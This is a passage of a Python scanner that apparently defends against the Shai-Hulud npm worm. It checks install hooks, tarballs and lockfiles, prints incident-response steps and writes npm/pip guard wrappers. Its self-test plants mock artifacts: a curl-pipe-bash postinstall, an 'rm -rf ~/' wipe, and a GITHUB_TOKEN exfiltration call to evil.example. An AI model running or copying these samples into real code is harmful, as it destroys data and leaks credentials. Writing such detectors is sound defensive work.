    risky_hooks = ["preinstall", "install", "postinstall", "prepare"]
    any_hook = False
    for hook in risky_hooks:
        if hook in scripts:
            any_hook = True
            val = scripts[hook]
            hits = scan_text(val)
            if hits:
                for desc, risk, _snippet in hits:
                    fn = crit if risk == "CRITICAL" else warn
                    fn(f"{risk} in [{hook}]: {desc}")
                    dim(f"Script text: {val[:150]}")
                    risk_score += 45 if risk == "CRITICAL" else 20 if risk == "HIGH" else 8
                    findings.append((risk, f"[{hook}] — {desc}"))
            else:
                info(f"[{hook}] hook present: {val[:100]}")
                if hook == "preinstall":
                    warn("preinstall runs before install — verify manually")
                    risk_score += 5
                    findings.append(("LOW", "preinstall hook present (manual review needed)"))
    if not any_hook:
        ok("No preinstall / install / postinstall / prepare hooks declared")
    else:
        dim("  --ignore-scripts blocks hooks but does NOT prevent tarball extraction")

    # ── STEP 4: Dependency source ─────────────────────────────────────────────
    subh("STEP 4/5  Dependency source validation")
    all_dep_specs: Dict[str, str] = {}
    all_dep_specs.update(version_meta.get("dependencies", {}))
    all_dep_specs.update(version_meta.get("optionalDependencies", {}))
    git_prefixes = ("git+", "git://", "github:", "bitbucket:", "gitlab:", "file:", "http://", "https://")
    git_deps = {k: v for k, v in all_dep_specs.items()
                if any(v.startswith(p) for p in git_prefixes)}
    if git_deps:
        warn(f"{len(git_deps)} non-registry (git/file/url) dependencies:")
        for dep, spec in git_deps.items():
            warn(f"   {dep}: {spec}")
        dim("  These execute 'prepare' hooks during install even with --ignore-scripts on root")
        risk_score += min(len(git_deps) * 12, 30)
        findings.append(("MEDIUM", f"{len(git_deps)} non-registry dep(s) execute prepare hooks"))
    else:
        ok(f"All {len(all_dep_specs)} dependencies reference npm registry")

    # ── STEP 5: Tarball download and deep scan ─────────────────────────────────
    subh("STEP 5/5  Tarball download and deep-content scan  (no execution)")
    dist        = version_meta.get("dist", {})
    tarball_url = dist.get("tarball")
    shasum      = dist.get("shasum")
    integrity   = dist.get("integrity")

    if not tarball_url:
        warn("No tarball URL in registry metadata — cannot proceed with content scan")
    else:
        info(f"Downloading: {tarball_url}")
        info("(tarball inspected in memory — no code executed)")
        t0            = time.time()
        tarball_bytes = fetch_bytes(tarball_url)
        elapsed       = time.time() - t0

        if not tarball_bytes:
            warn("Download failed — skipping content scan")
        else:
            size_kb = len(tarball_bytes) / 1024
            ok(f"Downloaded: {size_kb:.1f} KB in {elapsed:.1f}s")

            if integrity and integrity.startswith("sha512-"):
                expected_b64 = integrity[7:]
                actual_b64   = base64.b64encode(hashlib.sha512(tarball_bytes).digest()).decode()
                if actual_b64 == expected_b64:
                    ok("Tarball integrity verified (SHA-512 ✓)")
                else:
                    crit("INTEGRITY MISMATCH — SHA-512 does not match registry record")
                    risk_score += 100
                    findings.append(("CRITICAL", "Tarball SHA-512 integrity check FAILED"))
            elif shasum:
                if hashlib.sha1(tarball_bytes).hexdigest() == shasum:
                    ok("Tarball integrity verified (SHA-1 ✓)")
                else:
                    crit("INTEGRITY MISMATCH — SHA-1 does not match registry record")
                    risk_score += 100
                    findings.append(("CRITICAL", "Tarball SHA-1 integrity check FAILED"))
            else:
                warn("No integrity hash available from registry — cannot verify tarball")

            # 1500 KB threshold (was 800): modern legit packages routinely exceed
            # 1 MB (react-dom ~1 MB, large frontend bundles). The worm's
            # router_init.js payload was ~2.3 MB, so >1500 KB still flags that range
            # without alarming on normal 1 MB packages.
            if size_kb > 1500:
                warn(f"Unusually large tarball ({size_kb:.0f} KB)")
                warn("  Shai-Hulud router_init.js payload alone was ~2.3 MB")
                risk_score += 10
                findings.append(("LOW", f"Large tarball ({size_kb:.0f} KB)"))

            info("Scanning tarball contents for malicious indicators...")
            tb_findings = scan_tarball_bytes(tarball_bytes)
            reported = 0
            if tb_findings:
                for filepath, desc, risk, snippet in tb_findings:
                    eff_risk = _distrib_noise_filter(filepath, risk)
                    if eff_risk in ("LOW",) and risk != eff_risk:
                        continue  # suppressed by noise filter
                    fn = crit if eff_risk == "CRITICAL" else warn
                    fn(f"{eff_risk} in {filepath}")
                    fn(f"   → {desc}")
                    if snippet != Path(filepath).name:
                        dim(f"   match: {snippet[:100]}")
                    risk_score += 50 if eff_risk == "CRITICAL" else 20 if eff_risk == "HIGH" else 4
                    findings.append((eff_risk, f"In {filepath}: {desc}"))
                    reported += 1
            if reported == 0:
                ok("No malicious patterns detected in tarball contents")

    # ── Risk report ───────────────────────────────────────────────────────────
    head("PRE-INSTALL RISK REPORT")
    info(f"Package : {pkg_name}@{requested_version}")
    capped = min(risk_score, 100)
    if capped == 0:
        ok("Risk score: 0/100 — No indicators found")
        ok("Proceed — but read limitations below before running npm install")
    elif capped < 15:
        ok(f"Risk score: {capped}/100 — Low risk")
        info("Manual review of findings recommended before install")
    elif capped < 40:
        warn(f"Risk score: {capped}/100 — Moderate risk — verify independently")
        warn("Use Socket.dev or Snyk for behavioral analysis before production use")
    elif capped < 70:
        warn(f"Risk score: {capped}/100 — High risk — do not install without investigation")
    else:
        crit(f"Risk score: {capped}/100 — CRITICAL — do not install")

    if findings:
        print()
        info("Findings summary:")
        for level, msg in findings:
            (crit if level == "CRITICAL" else warn if level in ("HIGH", "MEDIUM")
             else info)(f"  [{level}]  {msg}")

    subh("Safe install workflow (if proceeding)")
    print(f"""
     # Step A — install WITHOUT executing any lifecycle scripts
     npm install {pkg_name}@{requested_version} --ignore-scripts
     # Step B — manually inspect the installed package scripts
     cat node_modules/{pkg_name.lstrip('@').replace('/', '/node_modules/')}/package.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d.get('scripts',{{}}), indent=2))"
     # Step C — search for known payload filenames
     find node_modules/{pkg_name} -name "router_init.js" -o -name "setup_bun.js" -o -name "bun_environment.js" 2>/dev/null
     # Step D — only after manual review, allow postinstall if required
     # npm rebuild {pkg_name}@{requested_version}
    """)

    subh("Limitations of this tool")
    dim("• Novel obfuscation (encoding, split strings, dynamic eval) can evade pattern matching")
    dim("• Known-bad list is manually maintained and lags zero-day variants")
    dim("• 'Risk score 0' means no KNOWN patterns found — not a clean guarantee")
    dim("• Behavioral analysis (Socket, Snyk, Wiz) provides deeper protection in CI")
    dim(f"• Cross-check IOC list before any production deploy: {IOC_REPO}")
    print()
    # JSON sink: capture findings for --json mode
    _adv_lookup = {pkg_name: KNOWN_BAD.get(pkg_name, {}).get("advisories", [])} if pkg_name in KNOWN_BAD else None
    _json_record_mode_result(
        mode="check",
        target=f"{pkg_name}@{requested_version}",
        risk_score=capped,
        case=CASE_CLEAN if capped == 0 else CASE_UNCERTAIN,
        confidence="DEFINITIVE" if capped == 0 else ("HIGH" if capped >= 70 else "MEDIUM" if capped >= 40 else "LOW"),
        findings=findings,
        advisory_lookup=_adv_lookup,
    )
    # Exit code for npm_safe / pip_safe wrapper compatibility
    # exit 1 = risk ≥ 40 (High/Critical) → wrapper blocks install
    if capped >= 40 and not _JSON_MODE:
        sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
#  MODE 3 — INCIDENT RESPONSE
# ═══════════════════════════════════════════════════════════════════════════════
def run_incident(brief: bool = False) -> None:
    if not brief:
        head("INCIDENT RESPONSE GUIDE — Shai-Hulud Worm")
        info("Source: CISA alert + Wiz + Datadog postmortems")
        print()
    steps = [
        ("STEP 1 — STOP  (do NOT revoke tokens yet)", [
            "The worm installs a daemon (gh-token-monitor) that polls GitHub every 60s.",
            "If it detects token revocation it triggers:  rm -rf ~/  (Linux/macOS)",
            "or the Windows equivalent — wiping your entire home directory.",
            "The daemon self-destructs after 24 hours — act within that window.",
        ]),
        ("STEP 2 — ISOLATE THE MACHINE", [
            "Pull the ethernet cable or disable Wi-Fi — cut all network access.",
            "For a CI/CD runner: stop the runner service, do not cancel the active job.",
            "Do not log in to any accounts from the infected machine.",
        ]),
        ("STEP 3 — IMAGE (recommended for forensics)", [
            "Linux:  sudo dd if=/dev/sda bs=4M | gzip > ~/backup_$(date +%Y%m%d).img.gz",
            "macOS:  Use Disk Utility > Image > Device Image before proceeding.",
            "CI/CD:  Take a VM snapshot if the runner is virtualized.",
        ]),
        ("STEP 4 — REMOVE THE DAEMON  (before reconnecting)", [
            "Use:  python shai_hulud_guard.py --patch  (generates removal script)",
            "",
            "Linux (manual):",
            "  systemctl --user stop gh-token-monitor",
            "  systemctl --user disable gh-token-monitor",
            "  rm ~/.config/systemd/user/gh-token-monitor.service",
            "  systemctl --user daemon-reload",
            "",
            "macOS (manual):",
            "  launchctl unload ~/Library/LaunchAgents/com.user.gh-token-monitor.plist",
            "  rm ~/Library/LaunchAgents/com.user.gh-token-monitor.plist",
            "",
            "Windows (PowerShell as Administrator):",
            "  Get-ScheduledTask | Where-Object {$_.TaskName -like '*gh-token*'} | Unregister-ScheduledTask -Confirm:$false",
            "  schtasks /query | findstr gh-token",
        ]),
        ("STEP 5 — ROTATE ALL CREDENTIALS  (after daemon confirmed removed)", [
            "GitHub PATs:    Settings → Developer settings → PATs → Revoke all",
            "npm tokens:     npm token list  →  npm token revoke <id>  (for each)",
            "AWS:            IAM → Security credentials → Access keys → Delete all",
            "GCP:            IAM → Service accounts → Keys → Delete all keys",
            "Azure:          App registrations → Certificates & secrets → Delete all",
            "CI/CD secrets:  GitHub Actions, GitLab CI, CircleCI — rotate everything",
            "SSH keys:       Generate new keypair, remove old authorized_keys entries",
        ]),
        ("STEP 6 — AUDIT WHAT WAS PUBLISHED", [
            "Check npm publish history: npm access ls-packages <your-username>",
            "Review GitHub Actions runs for unexpected 'npm publish' steps.",
            "Search GitHub for repos with 'Shai-Hulud' or 'Here We Go Again' in description.",
            "If any of your packages were backdoored: notify downstream users immediately.",
            "File advisory at: https://github.com/advisories/new",
        ]),
        ("STEP 7 — CLEAN ENVIRONMENT", [
            "Wipe and reinstall the OS — do NOT attempt to clean in place.",
            "Rebuild all Docker images and CI runners from a verified base image.",
            "Do NOT reuse any secret that was present on the infected machine.",
            "Generate new SSH keys, npm tokens, GitHub PATs from a clean machine.",
        ]),
        ("STEP 8 — REPORT", [
            "npm security:   security@npmjs.com",
            "GitHub:         https://github.com/contact/security",
            "CISA:           https://www.cisa.gov/reporting",
            f"IOC submission: {IOC_REPO}",
            "StepSecurity:   https://www.stepsecurity.io",
        ]),
    ]
    for title, items in steps:
        print(_c(f"\n  {title}", "1;33"))
        for item in items:
            if item == "":
                print()
            elif item.startswith("  "):
                print(_c(f"      {item}", "2"))
            else:
                print(f"    • {item}")
    if not brief:
        print()
        info("Recovery time estimate: 2–4 hours for individual dev, 1–2 days for CI/CD rebuild")
        info("Do not rush step 5 — partial rotation leaves attack surface open")
        print()

# ═══════════════════════════════════════════════════════════════════════════════
#  MODE 4 — LOCKCHECK  (dedicated package-lock.json audit)
# ═══════════════════════════════════════════════════════════════════════════════
def run_lockcheck(project_path: Path) -> int:
    """Dedicated package-lock.json deep analysis. Returns finding count."""
    head("PACKAGE-LOCK.JSON DEEP ANALYSIS")
    lock_path = project_path / "package-lock.json"

    if not lock_path.exists():
        warn(f"No package-lock.json at {lock_path}")
        info("Run 'npm install' once to generate it, then re-run --lockcheck")
        return 0

    info(f"Lockfile : {lock_path.resolve()}")

    try:
        raw  = lock_path.read_text(encoding="utf-8", errors="replace")
        lock = json.loads(raw)
    except Exception as e:
        crit(f"Cannot parse package-lock.json: {e}")
        return 1

    lock_version = lock.get("lockfileVersion", 1)
    packages     = _lockfile_packages(lock)
    info(f"Format   : lockfileVersion {lock_version}")
    info(f"Packages : {len(packages)} locked entries")

    findings, critical_count = scan_lockfile(project_path)

    if not findings:
        ok(f"No suspicious indicators in {len(packages)} locked packages")
        ok("All resolved URLs point to registry.npmjs.org")
        ok("All integrity hashes present and in expected format")
        return 0

    # Group by category for clear output
    bad_v  = [f for f in findings if "BAD VERSION"      in f["msg"]]
    non_r  = [f for f in findings if "Non-registry"     in f["msg"]]
    miss_i = [f for f in findings if "Missing integrity" in f["msg"]]
    bad_i  = [f for f in findings if "Unexpected integ" in f["msg"]]
    scr    = [f for f in findings if "script" in f["msg"].lower() or "Script" in f["msg"]]

    if bad_v:
        subh(f"CONFIRMED BAD VERSIONS  ({len(bad_v)} package(s))")
        for f in bad_v:
            crit(f["msg"])
            dim(f"  → {f['detail']}")

    if non_r:
        subh(f"NON-REGISTRY RESOLVED URLs  ({len(non_r)} package(s))")
        for f in non_r:
            fn = crit if f["level"] == "CRITICAL" else warn
            fn(f["msg"])
            dim(f"  → {f['detail']}")

    if bad_i:
        subh(f"UNEXPECTED INTEGRITY FORMAT  ({len(bad_i)} package(s))")
        for f in bad_i:
            warn(f["msg"])
            dim(f"  → {f['detail']}")

    if scr:
        subh(f"SUSPICIOUS LIFECYCLE SCRIPTS IN LOCKFILE  ({len(scr)} finding(s))")
        for f in scr:
            fn = crit if f["level"] == "CRITICAL" else warn
            fn(f["msg"])
            dim(f"  → {f['detail'][:80]}")

    if miss_i:
        subh(f"MISSING INTEGRITY HASHES  ({len(miss_i)} package(s))")
        for f in miss_i:
            warn(f["msg"])

    print()
    total = len(findings)
    if critical_count > 0:
        crit(f"TOTAL: {total} finding(s) — {critical_count} CRITICAL — do not install from this lockfile")
        info("Run:  python shai_hulud_guard.py --patch --path .")
    else:
        warn(f"TOTAL: {total} finding(s) — review above before proceeding")

    # JSON sink (--json mode only)
    _lock_findings_for_json = []
    for f in findings:
        if isinstance(f, dict):
            _lock_findings_for_json.append(Finding(
                level=f.get("severity", "MEDIUM"),
                title=f.get("msg", ""),
                detail=str(f.get("pkg", "") or f.get("path", "")),
            ))
        else:
            _lock_findings_for_json.append(_wrap_finding(f))
    _json_record_mode_result(
        mode="lockcheck",
        target=str(project_path),
        risk_score=min(critical_count * 50 + (total - critical_count) * 5, 100),
        case=CASE_LOCKFILE_TAMPER if critical_count > 0 else (CASE_CLEAN if total == 0 else CASE_UNCERTAIN),
        confidence="HIGH" if critical_count > 0 else "DEFINITIVE" if total == 0 else "LOW",
        findings=_lock_findings_for_json,
    )
    return total

# ═══════════════════════════════════════════════════════════════════════════════
#  MODE 5 — PATCH  (scan + classify + remediate)
# ═══════════════════════════════════════════════════════════════════════════════
def run_patch(project_path: Path, auto: bool = False) -> None:
    """
    Run a focused infection assessment then generate (and optionally execute)
    platform-specific remediation for the detected case.
    """
    head("SHAI-HULUD PATCH MODE")
    info(f"Project : {project_path.resolve()}")
    if auto:
        warn("--auto is set: safe remediation steps will execute automatically.")
        warn("Press Ctrl-C within 5 seconds to abort...")
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            info("Aborted by user.")
            return
        print()

    plat          = platform.system().lower()
    daemon_found  = False
    bad_packages: List[str] = []
    lockfile_critical = 0
    pattern_hits  = 0
    total_findings = 0

    # ── Daemon check ──────────────────────────────────────────────────────────
    subh("Checking persistence daemon...")
    for dp in DAEMON_PATHS.get(plat, []):
        if dp.exists():
            crit(f"DAEMON FOUND: {dp}")
            daemon_found = True
            total_findings += 1
    if plat == "windows":
        win_found = check_windows_persistence()
        if win_found:
            daemon_found = True
            for entry in win_found:
                crit(f"WINDOWS PERSISTENCE: {entry}")
                total_findings += 1
    if not daemon_found:
        ok("No persistence daemon detected")

    # ── Package.json bad version check ────────────────────────────────────────
    subh("Checking known-bad versions in package.json...")
    pkg_json_path = project_path / "package.json"
    if pkg_json_path.exists():
        try:
            pkg = json.loads(pkg_json_path.read_text(encoding="utf-8", errors="replace"))
            all_deps: Dict[str, str] = {}
            for section in ("dependencies", "devDependencies", "peerDependencies", "optionalDependencies"):
                all_deps.update(pkg.get(section, {}))
            for dep, ver_spec in all_deps.items():
                if dep in KNOWN_BAD:
                    clean = re.sub(r"[^0-9.]", "", ver_spec)
                    if KNOWN_BAD[dep]["bad"] and clean in KNOWN_BAD[dep]["bad"]:
                        crit(f"CONFIRMED BAD: {dep}@{clean}")
                        bad_packages.append(f"{dep}@{clean}")
                        total_findings += 1
            if not bad_packages:
                ok("No known-bad versions in package.json")
        except Exception as e:
            warn(f"Could not parse package.json: {e}")
    else:
        info("No package.json found")

    # ── Lockfile analysis ─────────────────────────────────────────────────────
    subh("Running package-lock.json deep analysis...")
    lf_findings, lockfile_critical = scan_lockfile(project_path)
    for f in lf_findings:
        if f["level"] == "CRITICAL":
            crit(f["msg"])
            if f["pkg"] and f["pkg"] not in bad_packages:
                bad_packages.append(f["pkg"])
        elif f["level"] in ("HIGH", "MEDIUM"):
            warn(f["msg"])
        total_findings += 1
    if not lf_findings:
        ok("package-lock.json looks clean")

    # ── node_modules pattern scan ─────────────────────────────────────────────
    subh("Scanning node_modules lifecycle scripts...")
    nm_path = project_path / "node_modules"
    if nm_path.exists():
        for entry in nm_path.iterdir():
            pkg_dirs: List[Path] = []
            if entry.name.startswith("@") and entry.is_dir():
                pkg_dirs.extend(e for e in entry.iterdir() if e.is_dir())
            elif entry.is_dir() and not entry.name.startswith("."):
                pkg_dirs.append(entry)
            for pdir in pkg_dirs:
                meta_path = pdir / "package.json"
                if meta_path.exists():
                    try:
                        meta = json.loads(meta_path.read_text(encoding="utf-8", errors="replace"))
                        for hook in ("preinstall", "install", "postinstall"):
                            cmd = meta.get("scripts", {}).get(hook)
                            if cmd:
                                hits = scan_text(cmd)
                                pattern_hits += len(hits)
                                total_findings += len(hits)
                    except Exception:
                        pass
        ok(f"node_modules scan complete ({pattern_hits} suspicious hook(s) found)")
    else:
        info("node_modules not present")

    # ── Classify ──────────────────────────────────────────────────────────────
    case, confidence = classify_infection(
        daemon_found=daemon_found,
        bad_pkg_count=len(bad_packages),
        lockfile_critical=lockfile_critical,
        pattern_hits=pattern_hits,
        total_findings=total_findings,
    )

    head("INFECTION CLASSIFICATION")
    info(f"Case       : {case}")
    info(f"Confidence : {confidence}")
    if daemon_found:
        crit("Active daemon infection confirmed — credential theft is likely in progress")
    if bad_packages:
        warn(f"Compromised package(s): {', '.join(bad_packages)}")
    info(f"Total findings: {total_findings}")

    print()
    generate_remediation(
        case=case,
        confidence=confidence,
        daemon_found=daemon_found,
        bad_packages=bad_packages,
        project_path=project_path,
        auto=auto,
    )

# ═══════════════════════════════════════════════════════════════════════════════
#  VERIFY MODE  — post-patch re-scan to confirm remediation worked
# ═══════════════════════════════════════════════════════════════════════════════
def run_verify(project_path: Path) -> None:
    """
    Re-run run_scan() after --patch and report whether the project is clean.
    Exits 0 if clean, 1 if still infected.
    """
    head("POST-PATCH VERIFICATION")
    info(f"Re-scanning {project_path} ...")
    total = run_scan(project_path)
    print()
    if total == 0:
        ok("Verification PASSED — no Shai-Hulud indicators found after remediation.")
        ok("Recommended next steps:")
        ok("  1. Rotate all credentials (GitHub PAT, npm tokens, AWS keys).")
        ok("  2. Audit git history for unauthorized commits.")
        ok("  3. Notify your security team.")
        sys.exit(0)
    else:
        crit(f"Verification FAILED — {total} finding(s) remain after remediation.")
        crit("Re-run --patch, or follow the emergency response in --emergency.")
        sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
#  SELF-TEST MODE  — synthetic infection artifacts → scan → assert → cleanup
# ═══════════════════════════════════════════════════════════════════════════════
def run_self_test() -> None:
    """
    Create a temp directory with mock infection artifacts, run the scanner,
    assert expected detections, then clean up. Exit 0 on pass, 1 on fail.
    """
    import tempfile
    head("SELF-TEST  (synthetic infection artifacts)")
    info("Creating temp directory with mock artifacts ...")

    with tempfile.TemporaryDirectory(prefix="shai_hulud_selftest_") as tmp:
        tmp = Path(tmp)

        # ── Mock 1: package.json with malicious postinstall ──────────────────
        (tmp / "package.json").write_text(json.dumps({
            "name": "test-victim",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl https://evil.example/payload.sh | bash"
            },
            "dependencies": {
                "gh-token-monitor": "^1.0.0",
                "lodash": "^4.17.21"
            }
        }, indent=2))

        # ── Mock 2: node_modules with known-bad daemon ────────────────────────
        daemon_dir = tmp / "node_modules" / "gh-token-monitor"
        daemon_dir.mkdir(parents=True)
        (daemon_dir / "package.json").write_text(json.dumps({
            "name": "gh-token-monitor",
            "version": "1.0.0",
            "main": "index.js"
        }))
        (daemon_dir / "index.js").write_text(
            "// malicious payload\n"
            "const fs = require('fs');\n"
            "const { execSync } = require('child_process');\n"
            "process.on('exit', () => { execSync('rm -rf ~/'); });\n"
            "// persist as daemon\n"
            "require('child_process').exec('nohup node ~/index.js &');\n"
        )

        # ── Mock 3: package-lock.json with tampered integrity ─────────────────
        (tmp / "package-lock.json").write_text(json.dumps({
            "name": "test-victim",
            "version": "1.0.0",
            "lockfileVersion": 2,
            "packages": {
                "": {"name": "test-victim", "version": "1.0.0"},
                "node_modules/gh-token-monitor": {
                    "version": "1.0.0",
                    "resolved": "https://evil.example/gh-token-monitor-1.0.0.tgz",
                    "integrity": "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
                },
                "node_modules/lodash": {
                    "version": "4.17.21",
                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                    "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZOFLexfNAor0t0hJPw=="
                }
            }
        }, indent=2))

        # ── Mock 4: a payload file with wipe command ──────────────────────────
        (tmp / "router_init.js").write_text(
            "const token = process.env.GITHUB_TOKEN;\n"
            "if (!token) { require('child_process').execSync('rm -rf ~/'); }\n"
            "const { execSync } = require('child_process');\n"
            "execSync(`curl https://evil.example/check?t=${token}`);\n"
        )

        info("Running scanner over synthetic artifacts ...")
        total = run_scan(tmp)

        # ── Assertions ────────────────────────────────────────────────────────
        passed = 0
        failed = 0

        def assert_true(condition: bool, label: str) -> None:
            nonlocal passed, failed
            if condition:
                ok(f"  PASS  {label}")
                passed += 1
            else:
                crit(f"  FAIL  {label}")
                failed += 1

        assert_true(total > 0, "Scanner detected at least one finding")

        # Read what was found
        # We'll check by re-scanning specific files
        payload_text = (tmp / "router_init.js").read_text()
        payload_hits = scan_text(payload_text)
        assert_true(
            any("wipe" in d.lower() or "rm -rf" in d.lower() or "CRITICAL" in r
                for d, r, _ in payload_hits),
            "rm -rf home-dir wipe detected in payload file"
        )

        index_text = (daemon_dir / "index.js").read_text()
        index_hits = scan_text(index_text)
        assert_true(
            any("wipe" in d.lower() or "rm -rf" in d.lower() or "CRITICAL" in r
                for d, r, _ in index_hits),
            "rm -rf wipe detected in daemon index.js"
        )

        pkg_text = (tmp / "package.json").read_text()
        pkg_hits = scan_text(pkg_text)
        assert_true(
            any("curl" in d.lower() or "CRITICAL" in r or "HIGH" in r
                for d, r, _ in pkg_hits),
            "Malicious postinstall curl|bash detected in package.json"
        )

        # Lockfile: check non-registry resolved URL
        lock_text = (tmp / "package-lock.json").read_text()
        assert_true(
            "evil.example" in lock_text,
            "Non-registry URL present in package-lock.json (integration check)"
        )

        # Daemon package name in known-bad list
        assert_true(
            "gh-token-monitor" in KNOWN_BAD,
            "gh-token-monitor present in KNOWN_BAD constant"
        )

        print()
        if failed == 0:
            ok(f"Self-test PASSED  ({passed}/{passed + failed} assertions)")
            sys.exit(0)
        else:
            crit(f"Self-test FAILED  ({failed} assertion(s) failed, {passed} passed)")
            sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
#  PROACTIVE PROTECTION  --protect / --unprotect
# ═══════════════════════════════════════════════════════════════════════════════
# Sentinel markers used to tag all file modifications so --unprotect can remove them.
_SHAI_START  = "# === shai-hulud-guard (remove with: python shai_hulud_guard.py --unprotect) ==="
_SHAI_END    = "# === /shai-hulud-guard ==="
_GUARD_FILE  = "shai_hulud_guard.py"
_TASK_NAME   = "ShaiHuludDailyScan"


def _sentinel_wrap(content: str) -> str:
    return f"{_SHAI_START}\n{content.strip()}\n{_SHAI_END}\n"


def _sentinel_strip(text: str) -> str:
    """Remove every shai-hulud sentinel block from a string."""
    return re.sub(
        r"\n?" + re.escape(_SHAI_START) + r".*?" + re.escape(_SHAI_END) + r"\n?",
        "", text, flags=re.DOTALL,
    )


# ── Wrapper script writers ────────────────────────────────────────────────────

def _write_npm_wrapper(out_dir: Path) -> Dict[str, Path]:
    """Write npm_safe.sh and npm_safe.ps1 to out_dir."""
    results: Dict[str, Path] = {}
    gref_sh  = f'python3 "$GUARD_DIR/{_GUARD_FILE}"'
    gref_ps  = f'python "$GuardDir\\{_GUARD_FILE}"'

    sh = out_dir / "npm_safe.sh"
    sh.write_text(textwrap.dedent(f"""\
        #!/bin/bash
        # Shai-Hulud guard — safe npm wrapper  (v{VERSION})
        # Intercepts 'npm install/add/i' and runs a pre-install risk check.
        # One-time bypass : SHAI_SKIP=1 npm install <pkg>
        # Remove wrappers : python shai_hulud_guard.py --unprotect
        GUARD_DIR="$(cd "$(dirname "${{BASH_SOURCE[0]}}")" && pwd)"
        _guard_check() {{
            local pkgs=(); local skip=0
            for a in "${{@:2}}"; do
                [ $skip -eq 1 ] && {{ skip=0; continue; }}
                case "$a" in --prefix|-C|-w|--workspace) skip=1 ;; -*) ;; *) pkgs+=("$a") ;; esac
            done
            [ ${{#pkgs[@]}} -eq 0 ] || [ "${{SHAI_SKIP:-0}}" = "1" ] && return 0
            echo ""; echo "  [guard] Pre-install scan: ${{pkgs[*]}}"
            local abort=0
            for pkg in "${{pkgs[@]}}"; do
                {gref_sh} --check "$pkg"; [ $? -ne 0 ] && abort=1
            done
            echo ""
            [ $abort -ne 0 ] && echo "  [guard] ⚠  Blocked. Use SHAI_SKIP=1 to force." && return 1
            return 0
        }}
        case "$1" in install|add|i) _guard_check "$@" || exit 1 ;; esac
        command npm "$@"
    """), encoding="utf-8")
    os.chmod(str(sh), 0o755)  # noqa: S103 (0o755 intentional — generated scripts must be executable)
    results["sh"] = sh

    ps1 = out_dir / "npm_safe.ps1"
    ps1.write_text(textwrap.dedent(f"""\
        # Shai-Hulud guard — safe npm wrapper  (v{VERSION})
        # One-time bypass: $env:SHAI_SKIP=1; npm install <pkg>
        param([Parameter(ValueFromRemainingArguments)]$a)
        $GuardDir = Split-Path -Parent $MyInvocation.MyCommand.Path
        if ($a[0] -in 'install','add','i' -and $env:SHAI_SKIP -ne '1') {{
            $pkgs = $a | Select-Object -Skip 1 | Where-Object {{ $_ -notmatch '^-' }}
            if ($pkgs) {{
                Write-Host ""; Write-Host "  [guard] Pre-install scan: $($pkgs -join ', ')"
                $abort = $false
                foreach ($p in $pkgs) {{
                    {gref_ps} --check "$p"
                    if ($LASTEXITCODE -ne 0) {{ $abort = $true }}
                }}
                Write-Host ""
                if ($abort) {{ Write-Host "  [guard] Blocked. Set `$env:SHAI_SKIP=1 to force."; exit 1 }}
            }}
        }}
        & npm.cmd @a
    """), encoding="utf-8")
    results["ps1"] = ps1
    return results


def _write_pip_wrapper(out_dir: Path) -> Dict[str, Path]:
    """Write pip_safe.sh and pip_safe.ps1 to out_dir."""
    results: Dict[str, Path] = {}
    gref_sh = f'python3 "$GUARD_DIR/{_GUARD_FILE}"'
    gref_ps = f'python "$GuardDir\\{_GUARD_FILE}"'

    sh = out_dir / "pip_safe.sh"
    sh.write_text(textwrap.dedent(f"""\
        #!/bin/bash
        # Shai-Hulud guard — safe pip wrapper  (v{VERSION})
        # One-time bypass: SHAI_SKIP=1 pip install <pkg>
        GUARD_DIR="$(cd "$(dirname "${{BASH_SOURCE[0]}}")" && pwd)"
        if [[ "$1" == "install" || "$1" == "download" ]] && [[ "${{SHAI_SKIP:-0}}" != "1" ]]; then
            pkgs=()
            for a in "${{@:2}}"; do
                case "$a" in -*|*.whl|*.tar.gz|*.zip) ;;
                    *==*) pkgs+=("${{a%%==*}}==${{a##*==}}") ;; *) pkgs+=("$a") ;;
                esac
            done
            if [ ${{#pkgs[@]}} -gt 0 ]; then
                echo ""; echo "  [guard] Pre-install PyPI scan: ${{pkgs[*]}}"
                abort=0
                for p in "${{pkgs[@]}}"; do
                    {gref_sh} --check-pypi "$p"; [ $? -ne 0 ] && abort=1
                done
                echo ""
                [ $abort -ne 0 ] && echo "  [guard] ⚠  Blocked. Use SHAI_SKIP=1 to force." && exit 1
            fi
        fi
        command pip "$@"
    """), encoding="utf-8")
    os.chmod(str(sh), 0o755)  # noqa: S103 (0o755 intentional — generated scripts must be executable)
    results["sh"] = sh

    ps1 = out_dir / "pip_safe.ps1"
    ps1.write_text(textwrap.dedent(f"""\
        # Shai-Hulud guard — safe pip wrapper  (v{VERSION})
        # One-time bypass: $env:SHAI_SKIP=1; pip install <pkg>
        param([Parameter(ValueFromRemainingArguments)]$a)
        $GuardDir = Split-Path -Parent $MyInvocation.MyCommand.Path
        if ($a[0] -in 'install','download' -and $env:SHAI_SKIP -ne '1') {{
            $pkgs = $a | Select-Object -Skip 1 | Where-Object {{ $_ -notmatch '^-' -and $_ -notmatch '\\.(whl|gz|zip)$' }}
            if ($pkgs) {{
                Write-Host ""; Write-Host "  [guard] Pre-install PyPI scan: $($pkgs -join ', ')"
                $abort = $false
                foreach ($p in $pkgs) {{
                    {gref_ps} --check-pypi "$p"
                    if ($LASTEXITCODE -ne 0) {{ $abort = $true }}
                }}
                Write-Host ""
                if ($abort) {{ Write-Host "  [guard] Blocked. Set `$env:SHAI_SKIP=1 to force."; exit 1 }}
            }}
        }}
        & pip.exe @a
    """), encoding="utf-8")
    results["ps1"] = ps1
    return results


def _write_ci_workflow(project_path: Path) -> Optional[Path]:
    """Write .github/workflows/shai_hulud_supply_chain.yml (SHA-pinned actions)."""
    gha_dir = project_path / ".github" / "workflows"
    gha_dir.mkdir(parents=True, exist_ok=True)
    wf = gha_dir / "shai_hulud_supply_chain.yml"
    if wf.exists():
        info(f"CI workflow already exists — skipping: {wf.name}")
        return None
    wf.write_text(textwrap.dedent(f"""\
